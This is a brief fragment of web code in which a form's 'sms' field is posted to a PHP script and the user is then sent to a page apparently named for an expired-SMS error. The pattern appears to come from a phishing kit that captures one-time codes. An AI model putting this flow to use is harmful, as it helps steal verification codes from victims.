...
$("#botomemail").attr("disabled", true);
          ...
          $.post("./system/send_sms.php?ajax", $("#sendcc").serialize(), function(result) {
                            setTimeout(function() {



                                $(location).attr("href", "./sms_espira_error");
                        });
                 });
        },
...
<input placeholder=" " id="sms" name="sms" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="text" required="true"  >
